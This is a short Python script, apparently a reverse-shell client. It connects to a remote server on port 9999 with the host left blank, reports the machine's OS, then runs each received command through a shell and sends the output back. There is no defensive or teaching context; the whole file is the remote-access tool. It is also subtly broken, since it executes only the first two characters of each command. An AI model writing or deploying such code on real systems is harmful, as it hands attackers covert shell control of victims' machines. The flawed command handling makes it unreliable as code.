import socket
import os 
import subprocess
import platform

s = socket.socket()

host="" #server IP address[mostly public ip address of the server computer]
port = 9999

s.connect((host,port))
name = platform.system().encode('utf-8')
#send OS type for commands
s.send(name)

while True:
    
    data = s.recv(1024)
    
    

    if data[:2].decode('utf-8') == "cd":
        os.chdir(data[3:].decode('utf-8'))

    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:2].decode('utf-8'), shell=True,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #open up a procees

        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte).encode('utf-8')
        currentWD = os.getcwd() + "> "
        s.send(output_str + currentWD.encode('utf-8'))
